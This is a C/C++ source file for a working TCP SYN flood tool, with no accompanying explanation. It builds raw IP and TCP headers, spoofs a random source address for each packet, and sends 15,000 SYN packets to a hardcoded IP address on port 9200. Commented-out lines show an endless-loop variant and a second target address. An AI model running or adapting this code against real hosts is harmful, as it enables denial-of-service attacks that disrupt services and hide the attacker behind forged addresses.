#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <iostream>
#include <time.h>
#include <stdlib.h>
#include "../../include/util/TypeTransform.h"



using namespace GCommon::GUtil;

struct pseudo_header
{
  unsigned int source_address;
  unsigned int dest_address;
  unsigned char placeholder;
  unsigned char protocol;
  unsigned short tcp_length;
  
  struct tcphdr tcp;

};


unsigned short csum(unsigned short *ptr,int nbytes){
  register long sum;
  unsigned short oddbyte;
  register short answer;

  sum=0;
  while(nbytes>1){
    sum+=*ptr++;
    nbytes-=2;
  }

  if(nbytes==1){
    oddbyte=0;
    *((u_char*)&oddbyte)=*(u_char*)ptr;
    sum+=oddbyte;
  }

  sum=(sum>>16)+(sum&0xffff);
  sum=sum+(sum>>16);
  answer=(short)~sum;

  return (answer);

}

//get a random num in 1--254
int mRandom(double start,double end){
  /*srand((int)time(0));
  int num=rand(); 
  return num%254;
  */
  return start+(end-start)*rand()/(RAND_MAX+1.0);

}



int main(int argc,char **argv){

  static int counter=0;
  srand(unsigned(time(0)));

while(counter<15000){
//while(1){

   
  //std::cout<<"get rand="<<mRandom(1,254)<<std::endl;

  int ipa1=mRandom(1,254);
  int ipa2=mRandom(1,254);
  int ipa3=mRandom(1,254);
  int ipa4=mRandom(1,254);

  std::string ipa;
  //ipa=CTypeTransform::IntToStr(ipa1);
  ipa=CTypeTransform::IntToStr(ipa1)+"."+CTypeTransform::IntToStr(ipa2)+"."+CTypeTransform::IntToStr(ipa3)+"."+CTypeTransform::IntToStr(ipa4);
  std::cout<<"ip ="<<ipa<<std::endl;

  /*
  counter++;
  continue;
  */

  int s=socket(PF_INET,SOCK_RAW,IPPROTO_TCP);
  
  char datagram[4096],source_ip[32];

  //ip header
  struct iphdr *iph=(struct iphdr*)datagram;

  struct tcphdr *tcph=(struct tcphdr*)(datagram+sizeof(struct ip));
  
  struct sockaddr_in sin;
  struct pseudo_header psh;


  //std::string attackIp;
  

  //strcpy(source_ip,"182.254.0.114");
  strcpy(source_ip,ipa.c_str());
 
  sin.sin_family =AF_INET;
  sin.sin_port = htons(9200);
  //sin.sin_addr.s_addr=inet_addr("183.60.77.84");
  sin.sin_addr.s_addr=inet_addr("182.254.233.115");

  memset(datagram,0,4096);

  iph->ihl=5;
  iph->version=4;
  iph->tos=0;
  iph->tot_len=sizeof(struct ip)+sizeof(struct tcphdr);
  iph->id=htons(9200);
  iph->frag_off=0;
  iph->ttl=255;
  iph->protocol=IPPROTO_TCP;
  iph->check=0;
  iph->saddr=inet_addr(source_ip);
  iph->daddr=sin.sin_addr.s_addr;

  iph->check=csum((unsigned short*)datagram,iph->tot_len>>1);

  tcph->source=htons(9200);
  tcph->dest=htons(9200);
  tcph->seq=0;
  tcph->ack_seq=0;
  tcph->doff=5;
  tcph->fin=0;
  tcph->syn=1;
  tcph->rst=0;
  tcph->psh=0;
  tcph->ack=0;
  tcph->urg=0;
  tcph->window=htons(5840);
  tcph->check=0;

  tcph->urg_ptr=0;

  psh.source_address=inet_addr(source_ip);  
  psh.dest_address=sin.sin_addr.s_addr;
  psh.placeholder=0;
  psh.protocol=IPPROTO_TCP;
  psh.tcp_length=htons(20);

  memcpy(&psh.tcp,tcph,sizeof(struct tcphdr));

  tcph->check=csum((unsigned short*)&psh,sizeof(struct pseudo_header));

  int one=1;
  const int *val=&one;
  if(setsockopt(s,IPPROTO_IP,IP_HDRINCL,val,sizeof(one))<0){
    printf("Error setting setsocket,errno=%d\n",errno);
    //exit(0);
    return 1;
  }


    if(sendto(s,datagram,iph->tot_len,0,(struct sockaddr *)&sin,sizeof(sin))<0){
      printf("Error when send\n");
    }else{
      counter++;
      printf("Packet send ,num=%d,\n\n",counter);
    }
  
}

  return 0;

}








